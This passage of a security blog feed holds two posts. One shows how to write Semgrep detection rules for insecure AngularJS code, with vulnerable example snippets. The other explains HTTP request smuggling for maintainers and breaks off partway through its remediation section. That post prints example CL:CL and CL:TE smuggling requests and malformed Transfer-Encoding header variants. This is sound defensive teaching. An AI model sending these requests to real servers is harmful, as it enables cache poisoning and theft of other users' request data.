&lt;p&gt;Semgrep internally uses a generic parser using yacc and ocaml-tree-sitter and some custom code to convert any programming language into an Intermediate Language/AST and then it is possible to conduct &lt;a href=&quot;https://github.com/returntocorp/pfff/blob/master/lang_FUZZY/parsing/lang_fuzzy.ml&quot;&gt;Fuzzy&lt;/a&gt; AST to &lt;a href=&quot;https://github.com/returntocorp/pfff/blob/master/h_program-lang/AST_generic.ml&quot;&gt;AST Matching&lt;/a&gt; on this result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/semgrep/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the engine code, there are references to pointer analysis and &lt;a href=&quot;https://github.com/returntocorp/pfff/tree/master/h_program-lang&quot;&gt;datalog&lt;/a&gt; but this doesn‚Äôt seem to be currently use and Dataflow/taint analysis seems to be planned in the future release by r2c.&lt;/p&gt;

&lt;p&gt;Semgrep can be considered a good alternative for ESLint since&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Well documented, rules are meant to be powered by community&lt;/li&gt;
  &lt;li&gt;Semgrep is provided under LGPL-license and is free for commercial use&lt;/li&gt;
  &lt;li&gt;Very easy to write custom configurations and semantic rules.&lt;/li&gt;
  &lt;li&gt;Supports popular languages incuding Python, JavaScript, Java, Go, C with PHP and TypeScript support on the way ü•≥&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As such I ported multiple rules from &lt;a href=&quot;https://github.com/LewisArdern/eslint-plugin-angularjs-security-rules&quot;&gt;AngularJS Security Rules For ESLint&lt;/a&gt; to Semgrep. The pull request I made can be seen here: &lt;a href=&quot;https://github.com/returntocorp/semgrep-rules/pull/834&quot;&gt;Pull Request to semgrep-rules repository&lt;/a&gt;. This blog post will highlight the basics of using Semgrep with some AngularJS examples.&lt;/p&gt;

&lt;h3 id=&quot;writing-rules---strict-contextual-escaping-sce-example&quot;&gt;Writing Rules - Strict Contextual escaping (SCE) Example&lt;/h3&gt;

&lt;p&gt;In the code below, the $sceProvider is set to false. Disabling Strict Contextual escaping (SCE) in an AngularJS application could provide additional attack surface for XSS vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var app = angular.module('MyApp', []).config(function ($sceProvider) {
    // ruleid: detect-angular-sce-disabled 
    $sceProvider.enabled(false);
});
 app.controller('myCtrl', function($scope) {

 $scope.userInput = 'foo';
     $scope.sayHello = function() {
	  $scope.html = &quot;Hello &amp;lt;b&amp;gt;&quot; + $scope.userInput + &quot;&amp;lt;/b&amp;gt;!&quot;

    };

 });


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;An example such as the above can be easily solved by using Semgrep since you only need to check if the value of $sceProvider.enabled is false. &lt;a href=&quot;https://semgrep.dev/s/snoopysecurity:sce-disabled&quot;&gt;Live Editor - SCE Disabled&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rules:
- id: my_pattern_id
  pattern: |
    $sceProvider.enabled(false);
  message: |
    Semgrep found a match
  severity: WARNING

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And due to the Semgrep only matching AST, this can be used to easily traverse through large codebases quickly.&lt;/p&gt;

&lt;h3 id=&quot;writing-rules---open-redirect-example&quot;&gt;Writing Rules - Open Redirect Example&lt;/h3&gt;

&lt;p&gt;The below code is a command example of open redirect that might happen when user input is conce $window.location.href&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var app = angular.module('MyApp', []);
app.controller('myCtrl', function($scope, $sce) {

$scope.userInput = 'foo';
    $scope.sayHello = function() {

     $window.location.href = input + '/app/logout';
     input = $scope.input;
     $window.location.href = input + '/app/logout';


     //Data is not coming from user input
     $location.location.location = test
     $window.location.href = &quot;//untatintedredirect&quot;
   };

});
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;One way to match code like this is to use &lt;code class=&quot;highlighter-rouge&quot;&gt;MetaVariables&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Expression Matching&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern: |&lt;/code&gt; option. Expression matching searches code for the given pattern. This pattern can match a full expression, or be part of a subexpression and this can be used to identify concatenation., and metavariables are used to track a value across a specific code scope. This includes variables, functions, arguments, classes, object methods, imports, exceptions, and more. Typed Metavariables are also supported for Java. More information regarding these two features can be seen here: &lt;a href=&quot;https://github.com/returntocorp/semgrep/blob/develop/docs/pattern-features.md#pattern-features-1&quot;&gt;Pattern Features&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      patterns:
        - pattern-either: 
          - pattern: |
              $SOURCE = $INPUT;
              $window.location.href = $SOURCE + $STATICVALUE;
          - pattern: |
              $window.location.href = $SOURCE + $STATICVALUE;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can even be taken one step further using the &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern-inside&lt;/code&gt; option and the &lt;code class=&quot;highlighter-rouge&quot;&gt;ellipsis&lt;/code&gt; operator. The ellipsis operator can be used to search for specific function calls or function calls with specific arguments. To search for all calls to a specific function, regardless of its arguments. This can be used to check if my initial pattern is occurring inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;app.controller&lt;/code&gt; function.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            app.controller(..., function($scope,$sce){ 
            ...
            });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://semgrep.dev/s/snoopysecurity:angular-or-redirect&quot;&gt;Live Editor Example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/semgrep/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;ellipsis&lt;/code&gt; operator itself is very useful and can be used to check for specific function calls, method calls, function definitions, class definitions, strings, arrays and conditionals.&lt;/p&gt;

&lt;p&gt;Another example of using &lt;code class=&quot;highlighter-rouge&quot;&gt;ellipsis&lt;/code&gt; is identifying the usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;angular.element&lt;/code&gt; method. &lt;code class=&quot;highlighter-rouge&quot;&gt;angular.element&lt;/code&gt; can lead to XSS if after,append,html,prepend,replaceWith,wrap are used with user-input. This can be matched using a pattern such as the below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angular.element($SOURCE).html(...);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The same concept can also be applied to match expressions that could be nested deep within another expression. &lt;a href=&quot;https://github.com/returntocorp/semgrep/blob/develop/docs/pattern-features.md#deep-expression-operator&quot;&gt;Deep Expression Operator&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;semgrep-yaml-file-breakdown&quot;&gt;Semgrep YAML File Breakdown&lt;/h3&gt;

&lt;p&gt;Patterns/Rules can be contributed to the &lt;a href=&quot;https://github.com/returntocorp/semgrep-rules&quot;&gt;semgrep-rules&lt;/a&gt; as a YAML file. An example of a pull request can be seen here: &lt;a href=&quot;https://github.com/returntocorp/semgrep-rules/pull/834&quot;&gt;Pull Request&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;An example of a YAML file can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rules:
    - id: detect-angular-translateprovider-useStrategy-method
      patterns:
        - pattern-either: 
          - pattern: |
              $translateSanitization.useStrategy();
        - pattern-inside: |
            app.controller(..., function($scope,$sce){ 
            ...
            });
      message: |
                If the $translateSanitization.useStrategy is set to null or blank this can be dangerous.
      languages:
      - javascript
      severity: WARNING
      metadata:
        references:
            - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl
            - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf
    - id: detect-angular-translateprovider-translations-method
      patterns:
        - pattern-either: 
          - pattern: |
              $translateProvider.translations(...,$SOURCE);
        - pattern-inside: |
            app.controller(..., function($scope,$sce){ 
            ...
            });
      message: |
                The use of $translateProvider.translations method can be dangerous if user input is provided to this API.
      languages:
      - javascript
      severity: WARNING
      metadata:
        references:
            - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl
            - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be broken down as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;patterns ‚Äì Pattern option to match&lt;/li&gt;
  &lt;li&gt;language ‚Äì Language syntax that can be matched&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Import YAML keys:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;id - ID of a rule, multiple rules can be added in the same file which can be triggered by one ID&lt;/li&gt;
  &lt;li&gt;metadata - Provide additional information such as references/links&lt;/li&gt;
  &lt;li&gt;message -Message to display when pattern is matched&lt;/li&gt;
  &lt;li&gt;pattern - Here we specify the logical option for a pattern to be matched. This can be &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern-not&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern-inside&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern-not-inside&lt;/code&gt; etc&lt;/li&gt;
  &lt;li&gt;severity - Severity of the rule&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;concluding-thoughts&quot;&gt;Concluding Thoughts&lt;/h3&gt;

&lt;p&gt;While Semgrep doesn‚Äôt support fully fledged static/program analysis such as CodeQL, it can be useful for writing quick patterns to search through large codebases quickly. I often find these sorts of features useful when trying to find interesting starting entry points while code reviewing which I can then dig into myself.&lt;/p&gt;

&lt;p&gt;I looked forward to Semgrep being the successor of other grep based code scanning projects such as &lt;a href=&quot;https://github.com/foospidy/GrepBugs&quot;&gt;GrepBugs&lt;/a&gt; and other open source projects which have died in the past.&lt;/p&gt;
</description>
        <pubDate>Wed, 02 Sep 2020 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/application-security/2020/09/02/02_writing_angularjs_semgrep_rules.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/application-security/2020/09/02/02_writing_angularjs_semgrep_rules.html</guid>
        
        
        <category>application-security</category>
        
      </item>
    
      <item>
        <title>Demystifying HTTP request smuggling</title>
        <description>&lt;p&gt;This is a cross post of the blog post written here:&lt;a href=&quot;https://snyk.io/blog/demystifying-http-request-smuggling/&quot;&gt;https://snyk.io/blog/demystifying-http-request-smuggling/&lt;/a&gt;. Often at my role as a Security Analyst within Snyk, I study trends within the dependency ecosystem which can result in finding interesting vulnerabilities. Recently I looked at HTTP Request Smuggling which resulted in the following disclosures.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-PYTHON-NETIUS-569141&quot;&gt;netius HTTP Request Smuggling&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-RUBY-REEL-569135&quot;&gt;reel HTTP Request Smuggling&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-PYTHON-MEINHELD-569140&quot;&gt;meinheld HTTP Request Smuggling&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-RUBY-GOLIATH-569136&quot;&gt;goliath HTTP Request Smuggling&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-RUBY-AGOO-569137&quot;&gt;agoo HTTP Request Smuggling&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For verifying the above libraries/packages/servers, i found the following tools very useful:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/portswigger/http-request-smuggler&quot;&gt;HTTP Request Smuggler&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/PortSwigger/turbo-intruder&quot;&gt;Turbo Intruder&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/defparam/smuggler&quot;&gt;Smuggler&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/defparam/tiscripts&quot;&gt;Turbo Intruder Scripts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;demystifying-http-request-smuggling&quot;&gt;Demystifying HTTP request smuggling&lt;/h3&gt;

&lt;p&gt;HTTP request smuggling is an interesting vulnerability type that has gained popularity over the last year. This vulnerability could allow an attacker to leverage specific features of the HTTP/1.1 protocol in order to bypass security protections, conduct phishing attacks, as well as obtain sensitive information from requests other than their own.&lt;/p&gt;

&lt;p&gt;It should also be noted that request smuggling has received widespread community attention through numerous high-paying bug bounty reports in the last few months, and Snyk observed that 18 HTTP request smuggling related to dependencies have been published in 2020 so far.&lt;/p&gt;

&lt;p&gt;This vulnerability was first discussed by Watchfire in their 2005 whitepaper entitled &quot;&lt;a href=&quot;https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf&quot;&gt;HTTP Request Smuggling&lt;/a&gt;&quot;. This work was later expanded upon by researcher &lt;a href=&quot;https://www.youtube.com/watch?v=dVU9i5PsMPY&quot;&gt;Regis Leroy&lt;/a&gt; and further discussed by James Kettle from Portswigger security during &lt;a href=&quot;https://www.youtube.com/watch?v=kgkRih2MQtU&quot;&gt;BlackHat USA 2019&lt;/a&gt; which gained further media attention.&lt;/p&gt;

&lt;p&gt;This blog post aims to demystify the vulnerability and provide remediation details for open source project maintainers looking to patch HTTP request smuggling within their projects.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Background&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With new attacks and vulnerabilities gaining popularity and media traction, open source libraries are often targeted by attackers to be exploited in the wild. It can often take weeks or years for these vulnerabilities to be remediated properly within these libraries due to a lack of remediation knowledge. In order to make the open source community secure, the Snyk Security Team often conducts research into vulnerabilities, such as HTTP request smuggling, to discover vulnerabilities within open source dependencies and provide actionable remediation advice to maintainers.&lt;/p&gt;

&lt;p&gt;One such task was undertaken by Snyk to identify the impact of HTTP request smuggling within the open source dependency ecosystem which resulted in discovering numerous vulnerabilities. More information regarding the discovered vulnerabilities can be found &lt;a href=&quot;https://app.snyk.io/disclosed-vulnerabilities/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Snyk found that there are not enough public sources that provide proper guidance into remediating HTTP request smuggling. Furthermore, it was noted that it took maintainers multiple releases to properly address and remediate this vulnerability. With this blog post, we aim to close that gap and help provide detailed remediation advice to any maintainer looking for guidance on this issue.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HTTP request smuggling vulnerability explained&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In order to understand HTTP Request Smuggling, the following areas must first be understood:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Keep-Alive and pipelining&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The concept of keep-alive and pipelining was initially published in &lt;a href=&quot;https://tools.ietf.org/html/rfc2616#section-14.13&quot;&gt;RFC 2616&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The Keep-Alive header is a hop-by-hop header that provides information about a persistent connection. In web servers, Keep-Alive can be specified within the &quot;Connection&quot; header which allows a web server to keep a TCP socket/connection open. By using this header, multiple requests and responses can use a single connection which can reduce overhead and improve performance for a web server. This feature is supported by all browsers and servers today.&lt;/p&gt;

&lt;p&gt;Pipelining is another feature that was introduced in RFC 2616. This allows a web server to process requests asynchronously‚Äîas a first-in-first-out stream rather than processing each request individually, allowing it to send a request without waiting for a previous response to arrive.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Content-Length and Transfer-Encoding&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;HTTP requests can have a message body. The presence of a message body in a request is signaled by a Content-Length or Transfer-Encoding header field. These headers are used for message framing, telling a server where a message ends and another begins.&lt;/p&gt;

&lt;p&gt;The Content-Length, specified in &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.2&quot;&gt;RFC 7230, section 3.3.2&lt;/a&gt;, is an HTTP header that indicates the size of the entity-body of the request. This is commonly seen in HTTP POST requests which have a body of data. It should be noted that GET requests typically shouldn't contain the Content-Length header since they have no body.&lt;/p&gt;

&lt;p&gt;Transfer-Encoding, also specified in &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-4.1&quot;&gt;RFC 7230&lt;/a&gt;, was created to allow the sending of binary data over HTTP. Transfer-Encoding has numerous directives, this blog will focus on the chunked directive.&lt;/p&gt;

&lt;p&gt;The chunked directive allows data to be sent in a &lt;strong&gt;series of chunks&lt;/strong&gt; along with the &lt;strong&gt;length of these chunks&lt;/strong&gt; specified in hexadecimal format, followed by &lt;strong&gt;carriage return&lt;/strong&gt; and a &lt;strong&gt;line feed&lt;/strong&gt;. The end of a chunked directive is stated by &lt;strong&gt;0 and an empty sequence&lt;/strong&gt;. An example of a chunked request can be seen below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: snyk.io
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

7 (length of chunks)

foo=bar (series of chunks)
0 (0 to terminate request followed by \r\n)
(\r\n)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Request smuggling&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A modern web server stack will often contain multiple web servers along with load balancers and WSGI servers. A basic diagram to visualize this can be seen as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/requestsmuggling/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HTTP request smuggling vulnerabilities arise when the frontend and the backend interpret the boundary of an HTTP request differently causing desynchronization between them. This is due to numerous frontend and backend libraries deviating from RFC specifications when dealing with both the Content-Length and the Transfer-Encoding header. HTTP request bodies can be framed according to these two headers and deviations from the specification occur. As a result, part of a request gets appended or smuggled, to the next one which allows the response of the smuggled request to be provided to another user.&lt;/p&gt;

&lt;p&gt;This vulnerability can be exploited to conduct phishing attacks, cache poisoning, Cross-Site Scripting (XSS), and more. More information regarding exploiting this vulnerability was published by James Kettle last year, during BlackHAT USA 2019, titled &quot;&lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;HTTP Desync Attacks: Request Smuggling Reborn&lt;/a&gt;&quot;. This blog will focus on the two most common request smuggling techniques:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CL:CL: Double Content-Length attack technique&lt;/li&gt;
  &lt;li&gt;CL:TE: Content-Length Transfer-Encoding attack technique&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CL:CL: Double Content-Length attack technique&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;According to &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC 7230, section 3.3.3#4&lt;/a&gt;, &quot;&lt;em&gt;If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error&lt;/em&gt;&quot;&lt;/p&gt;

&lt;p&gt;However, most middleware and web servers currently will loosely handle GET requests with a body. Furthermore&lt;a href=&quot;https://tools.ietf.org/html/rfc7231#section-4.3.1&quot;&gt;RFC 7231, section&lt;/a&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7231#section-4.3.1&quot;&gt;4.3#4.3.1&lt;/a&gt; states &quot;&lt;em&gt;A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request&lt;/em&gt;&quot;. This indicates this is a behavior most servers and proxies might support. TIn some cases, this can result in request smuggling attacks. This blog will explore one variation of this attack.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1
Content-Length: 43
Content-Length: 0
Host: snyk.io

GET /reqsmuggle HTTP/1.1
Host: snyk.io
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;When provided with two Content-Length headers, if implementation differences occur between a frontend and a backend on which Content-Length header to prioritize, smuggling attacks can occur.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/requestsmuggling/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above HTTP request, a request with two Content-Length headers is sent to a target that has a proxy or a load balancer as a frontend. The proxy will respect and prioritize the first Content-Length and see the smuggled request as part of the request body, even though a GET request shouldn't have a request body, and two Content-Length headers are provided. When this is processed by the backend, the first Content-Length header is ignored and the second Content-Length header is prioritized. Since the second Content-Length was set to zero, the backend will expect no request body and the &lt;em&gt;/reqsmuggle&lt;/em&gt; request is treated as another pipelined request. As such, the response of this smuggled request could be received by another user.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Content-Length: 11

hello worldHTTP/1.1 404 Not Found
Connection: Close
Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;CL:TE: Content-Length Transfer-Encoding attack technique&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This popular technique discovered by &lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;James Kettle of PortSwigger labs&lt;/a&gt; involves placing a Content-Length header and a Transfer-Encoding header in a single HTTP request and manipulating it in a way where a frontend proxy and backend server will prioritize these headers and process the smuggled request differently. An example request which demonstrates this vulnerability can be as follows.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /login HTTP/1.1
Host: snyk.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

16
login=xxx&amp;amp;amp;password=xxx
0

GET /404 HTTP/1.1
X-Foo: bar
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;When this request gets processed by a frontend proxy, it will respect the Content-Length header and prioritize this over the Transfer-Encoding header. However, the backend server will prioritize the Transfer-Encoding header. As such, the backend will process the request and will end at the character 0. As a result, the 404 GET request gets treated as a separate pipelined request.&lt;/p&gt;

&lt;p&gt;This issue occurs because the frontend prioritizes the Content-Length over Transfer-Encoding header. According to RFC 7230 Section 3.3.3#3, if a message with both Content-Length and Transfer-Encoding is accepted, the Transfer-Encoding header overrides the Content-Length. This is not followed by the frontend.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/requestsmuggling/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In cases where the frontend might prioritize the Transfer-Encoding header, it might be possible to bypass this limitation by inserting a malformed transfer encoding header instead of a valid one. Some examples of this can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Transfer-Encoding : chunked
tRANSFER-ENCODING: chunked
Transfer-Encoding: chunk
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Numerous HTTP libraries tolerate different variations of the Transfer-Encoding header and will normalize them to improve client experience. As such, by understanding what variations of the Transfer-Encoding header is normalized by the backend server, it might be possible to smuggle a malformed Transfer-Encoding header through the frontend and conduct a CL:TE smuggling attack.&lt;/p&gt;

&lt;p&gt;The examples above just demonstrate the vulnerability. In a real attack scenario, a smuggled request can be crafted to conduct phishing attacks, or steal data from a victim's request and send that to an attacker-controlled server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Scope and misconceptions&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;During this research, Snyk identified numerous cases where the obvious complexity of the multiple attack vectors led to misconceptions about HTTP request smuggling being reported to open source maintainers by researchers and maintainers, not always understanding if the criteria of remediation are in the scope of their maintained library or if it should be dealt with a dependency they are using as part of their library.&lt;/p&gt;

&lt;p&gt;Some of the challenges which required further clarification are as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Proxies/Load Balancers and other mediums, that can be categorized as frontend, are most affected by this vulnerability. However, a successful request smuggling attack requires the exploitation of both a vulnerable frontend and a backend.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The responsibility of remediation falls onto a backend maintainer as much as a frontend maintainer. One can argue that normalizing malformed headers should be acceptable behavior from a backend and make it more tolerant to user faults, and that the real problem is proxies which forward these requests without normalizing them first. But due to the vast ecosystem of dependencies and numerous libraries fitting the criteria of a backend and frontend, it is ideal for both parties to try and remediate this issue.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Middlewares, web servers that support reverse proxy capabilities, WSGI/High-Performance servers are considered to fit the backend criteria, not a web server that just supports the processing of malformed requests but doesn't support pipelining.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security reports are often disclosed to maintainers as HTTP request smuggling issues due to servers responding to multiple requests sent and this being visible as two separate responses. It should be noted that many servers support Keep-Alive and pipelining‚Äîthis by itself does not make an HTTP request smuggling vulnerability. This is the case in CVE-2020-12440 reported for NGINX.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Remediation&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;HTTP request smuggling issues occur due to deviations from the current HTTP specifications and multiple libraries not following RFC7230. Furthermore, remediation of this vulnerability can be tricky depending on whether you are a frontend or backend project maintainer. As such, Snyk has researched the remediation implemented by open source projects currently and categorized it as follows. To simplify, all remediation points are covered along with reasoning to which smuggling attack type this will remediate against. In an ideal scenario, all of the points mentioned below should be used to provide a Defense-in-Depth approach solution.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prioritize Transfer-Encoding over Content-Length&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;: This remediation will prevent CL:TE and TE:CL attacks&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Scope&lt;/strong&gt;: Frontend, Backend&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt;: When a request with both a Transfer-Encoding: chunked header and Content-length is received, the transfer-encoding header should be prioritized over Content-Length. This is referenced in RFC 7230 Section 3.3.3#3.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disallow requests with both Content-length and Transfer encoding and double Content-Length headers&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;: This remediation will prevent CL:CL, CL:TE and TE:CL attacks&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Scope&lt;/strong&gt;: Backend, Frontend, Backend, Upstream libraries&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt;: This can be seen as a better alternative to &quot;Prioritize Transfer-Encoding over Content-Length&quot; solution. Runtime platforms such as Node.js have used this solution to remediate against request smuggling where any requests with both headers are returned with an HTTP 400 response.&lt;/p&gt;

&lt;p&gt;Snyk believes this technique to be an ideal fix to prevent smuggling issues. However, considerations should be taken on how the fix is applied; especially if the fix is applied to a low-level HTTP library or an upstream engine numerous packages, such as a frontend, depend upon.&lt;/p&gt;

&lt;p&gt;When remediation HTTP request smuggling issues, &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC 7230 #3.3.3&lt;/a&gt; should be followed. &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;Section 3.3.3#3&lt;/a&gt;in RFC 7230 states:&lt;/p&gt;

&lt;p&gt;&quot;&lt;em&gt;If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.&quot;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;However, this is different from what is stated within &lt;a href=&quot;https://tools.ietf.org/html/rfc2616#section-4.4&quot;&gt;RFC 2616 4.4#3&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&quot;&lt;em&gt;If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.&quot;&lt;/em&gt;&lt;/p&gt;

